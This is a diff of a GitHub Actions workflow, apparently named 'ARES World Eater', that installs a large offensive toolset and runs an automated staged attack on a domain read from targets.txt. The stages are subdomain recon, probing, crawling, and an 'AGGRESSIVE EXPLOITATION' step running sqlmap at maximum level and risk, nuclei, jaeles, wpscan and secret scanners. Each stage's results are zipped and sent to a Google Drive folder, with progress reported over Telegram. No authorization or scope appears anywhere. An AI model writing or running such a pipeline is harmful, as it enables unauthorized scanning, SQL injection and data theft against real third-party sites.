@@ -1,29 +1,30 @@
-name: ARES War Machine - TOTAL ARSENAL ABSOLUTE
+name: ARES World Eater - UNRESTRICTED FINALITY
 on:
   workflow_dispatch:
 
 jobs:
   security-hunt:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
+    timeout-minutes: 360 # Maximum GitHub limit
     steps:
       - name: Checkout Repo
         uses: actions/checkout@v4
 
-      - name: "Full Global Arsenal & Wordlist Load"
+      - name: "Total Arsenal & Environment Injection"
         run: |
           sudo apt-get update
-          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev
+          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev nikto recon-ng dnsrecon
           mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns output/fuzzing output/specialized wordlists
           echo "$HOME/bin" >> $GITHUB_PATH
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+          
+          # INSTALLERS
+          sudo gem install wpscan || true
           pip3 install google-api-python-client google-auth-oauthlib google-auth-httplib2
+          pip3 install sqlmap arjun wfuzz gitleaks trufflehog prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright || true
+          python3 -m playwright install chromium || true
 
-          # WORDLISTS
-          wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt -O wordlists/dir-med.txt
-          wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -O wordlists/subs.txt
-
-          # THE FULL 60+ TOOL INSTALLATION
+          # GO Arsenal
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
@@ -31,104 +32,80 @@ jobs:
           go install -v github.com/hahwul/dalfox/v2@latest || true
           go install -v github.com/ffuf/ffuf@latest || true
           go install -v github.com/sensepost/gowitness@latest || true
-          go install -v github.com/lc/gau/v2/cmd/gau@latest || true
-          go install -v github.com/tomnomnom/waybackurls@latest || true
-          go install -v github.com/tomnomnom/assetfinder@latest || true
           go install -v github.com/jaeles-project/jaeles@latest || true
-          go install -v github.com/hakluke/hakrawler@latest || true
-          
-          pip3 install sqlmap arjun wfuzz gitleaks trufflehog s3scanner prowler commix ghauri nosqlmap waymore jsluice jwt_tool kiterunner wpscan eyewitness secretfinder cloudsplaining tplmap xsstrike gitdorker dirsearch subjack nicto recon-ng || true
-          
-          git clone https://github.com/m4ll0k/SecretFinder.git $HOME/tools/SecretFinder && pip3 install -r $HOME/tools/SecretFinder/requirements.txt || true
-          git clone https://github.com/devanshbatham/paramspider $HOME/tools/paramspider && pip3 install $HOME/tools/paramspider/. || true
+          go install -v github.com/tomnomnom/assetfinder@latest || true
+          go install -v github.com/haccer/subjack@latest || true
 
-      - name: "ARES Persistent Execution & Absolute Sync"
+          # Signatures
+          jaeles config init && git clone --depth 1 https://github.com/jaeles-project/jaeles-signatures.git $HOME/.jaeles/signatures-base || true
+
+      - name: "ARES Execution & Emergency Drive Sync"
         env:
           CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
           CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
           REFRESH_TOKEN: ${{ secrets.GOOGLE_REFRESH_TOKEN }}
-          FOLDER_ID: "1kkJnI4qtvfYukua8F1uzoimQyxBlBsWM"
+          PARENT_FOLDER_ID: "1kkJnI4qtvfYukua8F1uzoimQyxBlBsWM"
           TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
           TARGET=$(cat targets.txt | head -n 1)
           send_msg() { curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1"; }
           
-          # Persistent OAuth2 Uploader (Acts as Harsh, uses 15GB space)
+          # Organized Uploader (Batch Mode)
           cat << 'EOF' > oauth_upload.py
           import os, sys
           from google.oauth2.credentials import Credentials
           from googleapiclient.discovery import build
           from googleapiclient.http import MediaFileUpload
-          def upload(f_path, folder_id):
+          def get_or_create_folder(service, folder_name, parent_id):
+              query = f"name = '{folder_name}' and '{parent_id}' in parents and mimeType = 'application/vnd.google-apps.folder' and trashed = false"
+              results = service.files().list(q=query, fields="files(id)").execute().get('files', [])
+              if results: return results[0]['id']
+              meta = {'name': folder_name, 'parents': [parent_id], 'mimeType': 'application/vnd.google-apps.folder'}
+              return service.files().create(body=meta, fields='id').execute().get('id')
+          def upload(f_path, parent_id, tool_name):
               if not os.path.exists(f_path) or os.path.getsize(f_path) == 0: return
               creds = Credentials(None, refresh_token=os.environ['REFRESH_TOKEN'], token_uri="https://oauth2.googleapis.com/token", client_id=os.environ['CLIENT_ID'], client_secret=os.environ['CLIENT_SECRET'])
               service = build("drive", "v3", credentials=creds)
-              meta = {"name": os.path.basename(f_path), "parents": [folder_id]}
+              tool_folder_id = get_or_create_folder(service, tool_name, parent_id)
+              meta = {"name": os.path.basename(f_path), "parents": [tool_folder_id]}
               media = MediaFileUpload(f_path, resumable=True)
-              service.files().create(body=meta, media_body=media, supportsAllDrives=True).execute()
+              service.files().create(body=meta, media_body=media).execute()
           if __name__ == "__main__":
-              upload(sys.argv[1], sys.argv[2])
+              upload(sys.argv[1], sys.argv[2], sys.argv[3])
           EOF
 
-          send_msg "☢️ *ARES ABSOLUTE:* 25-Stage Total War Engaged on \`$TARGET\`"
+          send_msg "☢️ *ARES WORLD EATER:* Engaged on \`$TARGET\`"
 
-          # 1-4: DNS & SUBDOMAIN TAKEOVER
-          subfinder -d $TARGET -all -recursive -o output/recon/subs.txt
-          assetfinder --subs-only $TARGET >> output/recon/subs.txt
-          subjack -w output/recon/subs.txt -t 100 -timeout 30 -o output/recon/takeover.txt || true
-          [ ! -s output/recon/subs.txt ] && echo $TARGET > output/recon/subs.txt
-          python3 oauth_upload.py "output/recon/subs.txt" "$FOLDER_ID"
+          # 1. RECON (No Timeouts)
+          subfinder -d $TARGET -all -recursive -o output/recon/subfinder.txt
+          assetfinder --subs-only $TARGET >> output/recon/subfinder.txt
+          nikto -h "https://$TARGET" -o output/recon/nikto.txt || true
+          sort -u output/recon/subfinder.txt > output/recon/all_subs.txt
+          zip -j recon.zip output/recon/* && python3 oauth_upload.py "recon.zip" "$PARENT_FOLDER_ID" "Stage_1_Recon"
 
-          # 5-6: PROBING & VISUAL
-          httpx -l output/recon/subs.txt -sc -td -title -ip -o output/probing/live.txt
-          [ ! -s output/probing/live.txt ] && echo "http://$TARGET" > output/probing/live.txt
+          # 2. PROBING & VISUAL
+          httpx -l output/recon/all_subs.txt -status-code -title -ip -tech-detect -silent -o output/probing/live.txt || true
           xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
-          zip -r "screenshots.zip" output/screenshots/ && python3 oauth_upload.py "screenshots.zip" "$FOLDER_ID"
+          zip -r visual.zip output/screenshots/ output/probing/live.txt && python3 oauth_upload.py "visual.zip" "$PARENT_FOLDER_ID" "Stage_2_Visual"
 
-          # 7-10: CRAWLING & HARVESTING (Katana, Hakrawler, Gau, Wayback)
-          katana -l output/probing/live.txt -d 10 -jc -o output/crawling/urls.txt
-          hakrawler -url "http://$TARGET" -depth 3 >> output/crawling/urls.txt || true
-          gau $TARGET >> output/crawling/urls.txt || true
+          # 3. CRAWLING (Katana + Waymore Playwright)
+          katana -l output/probing/live.txt -d 10 -jc -o output/crawling/katana.txt || true
           waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
-          python3 oauth_upload.py "output/crawling/urls.txt" "$FOLDER_ID"
+          grep "?" output/crawling/katana.txt > output/crawling/params.txt || true
+          zip -j crawl.zip output/crawling/* && python3 oauth_upload.py "crawl.zip" "$PARENT_FOLDER_ID" "Stage_3_Crawling"
 
-          # 11-13: FUZZING & DIR BRUTE (FFUF, Dirsearch, WFuzz)
-          ffuf -w wordlists/dir-med.txt -u http://$TARGET/FUZZ -t 100 -o output/fuzzing/ffuf.json || true
-          dirsearch -u http://$TARGET -e php,html,js -o output/fuzzing/dirsearch.txt || true
-          wfuzz -w wordlists/dir-med.txt --hc 404 http://$TARGET/FUZZ > output/fuzzing/wfuzz.txt || true
-          python3 oauth_upload.py "output/fuzzing/ffuf.json" "$FOLDER_ID"
+          # 4. AGGRESSIVE EXPLOITATION
+          nuclei -l output/probing/live.txt -severity critical,high,medium -json -o output/vulns/nuclei.json || true
+          [ -s output/crawling/params.txt ] && sqlmap -m output/crawling/params.txt --batch --level 5 --risk 3 > output/vulns/sqlmap.txt || true
+          jaeles scan -u "https://$TARGET" -s $HOME/.jaeles/signatures-base/ -o output/vulns/jaeles/ || true
+          zip -r vulns.zip output/vulns/* && python3 oauth_upload.py "vulns.zip" "$PARENT_FOLDER_ID" "Stage_4_Exploits"
 
-          # 14-15: PARAMETER DISCOVERY (Arjun, ParamSpider)
-          arjun -u "http://$TARGET" -oT output/fuzzing/params.txt || true
-          paramspider -d $TARGET --level high -o output/fuzzing/paramspider.txt || true
-          python3 oauth_upload.py "output/fuzzing/params.txt" "$FOLDER_ID"
+          # 5. SECRETS & SPECIALIZED
+          trufflehog filesystem . > output/secrets/truffle.txt || true
+          wpscan --url "https://$TARGET" --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
+          python3 -m corsy.corsy -u "https://$TARGET" > output/specialized/corsy.txt || python3 -m corsy -u "https://$TARGET" > output/specialized/corsy.txt || true
+          zip -r final.zip output/secrets/ output/specialized/ && python3 oauth_upload.py "final.zip" "$PARENT_FOLDER_ID" "Stage_5_Final"
 
-          # 16-18: INJECTION (SQLMap Level 5, Ghauri, TPLMap)
-          sqlmap -m output/crawling/urls.txt --batch --level 5 --risk 3 --threads 10 > output/vulns/sqlmap.txt || true
-          ghauri -u "http://$TARGET" --batch --dbs > output/vulns/ghauri.txt || true
-          tplmap -u "http://$TARGET" --batch > output/vulns/tplmap.txt || true
-          python3 oauth_upload.py "output/vulns/sqlmap.txt" "$FOLDER_ID"
-
-          # 19-21: WEB VULNS (Nuclei, XSStrike, Dalfox, Commix)
-          nuclei -l output/probing/live.txt -severity critical,high,medium -o output/vulns/nuclei.txt
-          xsstrike -u "http://$TARGET" --crawl --seeds output/crawling/urls.txt > output/vulns/xsstrike.txt || true
-          dalfox file output/crawling/urls.txt -o output/vulns/xss.txt || true
-          commix --url="http://$TARGET" --batch > output/vulns/commix.txt || true
-          python3 oauth_upload.py "output/vulns/nuclei.txt" "$FOLDER_ID"
-
-          # 22-23: SECRETS (TruffleHog, SecretFinder, GitDorker)
-          trufflehog github --repo="https://github.com/$TARGET" > output/secrets/truffle.txt || true
-          cat output/crawling/urls.txt | grep ".js" | xargs -I % python3 $HOME/tools/SecretFinder/SecretFinder.py -i % -o cli > output/secrets/js.txt || true
-          python3 oauth_upload.py "output/secrets/js.txt" "$FOLDER_ID"
-
-          # 24-25: SPECIALIZED (WPScan, Nikto, S3Scanner, Kiterunner)
-          wpscan --url http://$TARGET --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
-          nikto -h "http://$TARGET" -o output/specialized/nikto.txt || true
-          s3scanner --bucket $TARGET > output/specialized/s3.txt || true
-          kiterunner scan http://$TARGET -o output/specialized/kiterunner.txt || true
-          python3 oauth_upload.py "output/specialized/wpscan.txt" "$FOLDER_ID"
-
-          # TOTAL PURGE
-          rm -rf output/ wordlists/
-          send_msg "✅ *ARES:* Absolute Mission Complete. Check Drive."
+          send_msg "✅ *ARES:* World Eater Mission Complete."
+          
